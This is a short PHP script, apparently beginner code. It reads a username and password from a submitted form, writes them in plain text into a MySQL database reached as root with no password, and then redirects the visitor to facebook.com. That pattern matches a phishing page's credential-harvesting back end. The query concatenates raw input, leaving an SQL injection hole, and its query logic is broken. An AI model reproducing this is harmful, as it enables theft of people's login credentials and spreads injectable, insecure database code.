<?php
$con=mysqli_connect('127.0.0.1','root','','tutriol');
if($con)
{
	echo "connected";
}
else
{
	echo "not connected";
}

$name=$_POST['username'];
$passwd=$_POST['password'];

$sql = $con->query ("INSERT INTO person (username,password) VALUES ('$name', '$passwd')");
if(mysqli_query($con,$sql))
{
	header('location:https://www.facebook.com');
}
else{

	echo "not inserted"; 
}
?>